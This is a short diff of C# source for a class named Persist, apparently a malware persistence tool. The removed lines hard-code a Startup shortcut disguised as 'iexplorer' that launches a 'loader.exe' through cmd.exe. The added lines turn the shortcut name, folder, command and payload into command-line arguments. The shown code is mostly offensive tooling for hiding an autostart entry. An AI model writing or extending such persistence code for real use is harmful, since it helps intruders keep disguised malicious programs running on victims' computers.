@@ -1,6 +1,4 @@
 
-
-
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -82,12 +80,9 @@ public class Persist
 
 		}
 	}
-	private static void Perst()
+	private static void Perst(string lnkname, string newstartupname, string command, string commandargs)
 	{
-		string lnkname = "iexplorer";
-		string newstartupname = "Startup";
-		string command = @"C:\Windows\System32\cmd.exe";
-		string commandargs = @"/c c:\users\issam\desktop\test\loader.exe";
+		
 		bool checkp = CheckPersistence(lnkname, newstartupname);
 		if (!checkp)
 		{
@@ -96,6 +91,11 @@ public class Persist
 	}
 	public static void Main(string[] args)
 	{
-		Perst();
+		
+		string lnkname = args[0];
+		string newstartupname = args[1];
+		string command = args[2];
+		string commandargs = "/c " + args[3];
+		Perst(lnkname, newstartupname, command, commandargs);
 	}
 }
